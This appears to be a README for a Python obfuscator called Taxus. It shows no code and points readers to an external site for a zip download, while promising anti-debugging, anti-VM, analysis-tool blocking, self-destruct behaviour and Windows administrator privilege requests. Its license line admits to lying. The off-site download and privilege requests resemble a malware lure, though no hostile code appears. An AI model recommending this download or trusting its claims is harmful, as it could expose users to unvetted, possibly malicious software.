# 🌳 Taxus Python Obfuscator

![Python Version](https://img.shields.io/badge/python-3.6+-blue.svg)
![License](https://img.shields.io/badge/license-MIT-green.svg)
![Version](https://img.shields.io/badge/version-2.0-brightgreen)

**Taxus** is an advanced, multi-layered obfuscator for Python designed to transform your code into a protected, unreadable format. It provides military-grade protection for your intellectual property against reverse engineering, AI-based analysis, and unauthorized access.

***

## ✨ Key Features

* **🛡️ Triple-Layer Encryption**: Your code undergoes three distinct encryption layers, each with a unique algorithm, making manual or automated decryption nearly impossible.
* **🤖 AI-Resistant**: Employs specialized techniques to confuse and prevent AI-based deobfuscation tools from successfully analyzing the protected code's logic.
* **🐞 Anti-Debugging & Anti-VM**: Includes advanced, real-time detection mechanisms to identify and terminate the script if it's being run in a debugging or virtualized environment.
* **🧠 Memory Protection**: Sensitive data and decrypted code segments are securely wiped from memory after use, preventing memory dumping and extraction attacks.
* **⚙️ AST-Based Obfuscation**: Manipulates the Abstract Syntax Tree (AST) for deep, structural code transformation that obscures logic while perfectly preserving functionality.

***

## 🚀 Download & Installation

You can download the latest version of the Taxus Obfuscator directly from our website.

**[➡️ Download Taxus Obfuscator v2.0](https://gettaxus.vercel.app/PythonObfuscator.html)**

The download is a `.zip` file containing the obfuscator script, an installation guide, and example files.

1.  **Unzip the file**: Extract the contents of `obfuscator.zip`.
2.  **Install dependencies**: Taxus requires a few packages to enable its full protection suite. They are automatically installed on your system, if failed: You can install them via pip:
    ```bash
    pip install psutil astor pycryptodome
    ```

***

## 💻 How to Use

Using the obfuscator is straightforward. Simply run the obfuscator, select your file and wait, the protected file is named `FileName_taxus_protected.py`.


### Example Transformation

Here’s a simple "before and after" to demonstrate the power of Taxus.

<table>
<thead>
  <tr>
    <th>Original Code (your_script.py)</th>
    <th>Obfuscated Code (your_script_protected.py)</th>
  </tr>
</thead>
<tbody>
<tr>
<td valign="top">
<pre lang="python">
def calculate_sum(a, b):
    result = a + b
    return result

</pre>
</td>
<td valign="top">
<pre lang="python">
Check the website for obfuscated output example
</pre>
</td>
</tr>
</tbody>
</table>

***

## 🛡️ Protection Details

* **Self-Destruct Mechanism**: The protected file contains brand signatures. If these are tampered with or removed, the script will refuse to run or may self-destruct.
* **Analysis Blocking**: Actively detects and blocks common analysis tools like `IDA`, `Ghidra`, `x64dbg`, and Python's native `sys.gettrace`.
* **Admin Privileges**: The protected script may request administrator privileges on Windows to install necessary dependencies for its security features.
* **Cross-Platform**: Compatible with Python 3.6+ on Windows and Linux.

***

## 🤝 Community & Support

Have questions, suggestions, or need help? Join our official Discord server to connect with the community and developers.

**[<img src="https://img.shields.io/discord/YOUR_SERVER_ID?style=for-the-badge&logo=discord" alt="Discord">](https://discord.gg/r6JRRZMfc2)**

***

## 📜 License

This project is licensed under the MIT License. (Im lying my ass off, please dont skid)
